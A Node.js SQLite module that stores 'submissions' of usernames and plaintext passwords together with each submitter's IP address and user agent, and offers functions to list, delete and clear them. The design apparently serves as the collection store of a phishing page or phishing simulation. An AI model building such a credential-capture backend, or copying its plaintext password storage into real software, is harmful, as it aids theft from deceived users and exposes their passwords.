const sqlite3 = require('sqlite3').verbose();
const path = require('path');

const DB_PATH = path.join(__dirname, 'database.sqlite');

const db = new sqlite3.Database(DB_PATH, (err) => {
    if (err) {
        console.error('Failed to connect to SQLite database:', err.message);
    } else {
        console.log('Connected to SQLite database at:', DB_PATH);
    }
});

// Initialize database schema
db.serialize(() => {
    db.run(`
        CREATE TABLE IF NOT EXISTS submissions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL,
            password TEXT NOT NULL,
            ip_address TEXT,
            user_agent TEXT,
            created_at DATETIME DEFAULT (datetime('now', 'localtime'))
        )
    `, (err) => {
        if (err) {
            console.error('Error creating submissions table:', err.message);
        } else {
            console.log('Submissions table is ready.');
        }
    });
});

/**
 * Insert a new submission record
 */
function addSubmission({ username, password, ipAddress, userAgent }) {
    return new Promise((resolve, reject) => {
        const query = `
            INSERT INTO submissions (username, password, ip_address, user_agent)
            VALUES (?, ?, ?, ?)
        `;
        db.run(query, [username, password, ipAddress, userAgent], function (err) {
            if (err) {
                return reject(err);
            }
            resolve({
                id: this.lastID,
                username,
                password,
                ip_address: ipAddress,
                user_agent: userAgent
            });
        });
    });
}

/**
 * Retrieve all submissions ordered by newest first
 */
function getAllSubmissions() {
    return new Promise((resolve, reject) => {
        const query = `SELECT * FROM submissions ORDER BY id DESC`;
        db.all(query, [], (err, rows) => {
            if (err) {
                return reject(err);
            }
            resolve(rows);
        });
    });
}

/**
 * Delete a submission by ID
 */
function deleteSubmission(id) {
    return new Promise((resolve, reject) => {
        const query = `DELETE FROM submissions WHERE id = ?`;
        db.run(query, [id], function (err) {
            if (err) {
                return reject(err);
            }
            resolve({ deleted: this.changes > 0 });
        });
    });
}

/**
 * Clear all submissions
 */
function clearAllSubmissions() {
    return new Promise((resolve, reject) => {
        const query = `DELETE FROM submissions`;
        db.run(query, [], function (err) {
            if (err) {
                return reject(err);
            }
            resolve({ clearedCount: this.changes });
        });
    });
}

module.exports = {
    db,
    addSubmission,
    getAllSubmissions,
    deleteSubmission,
    clearAllSubmissions
};
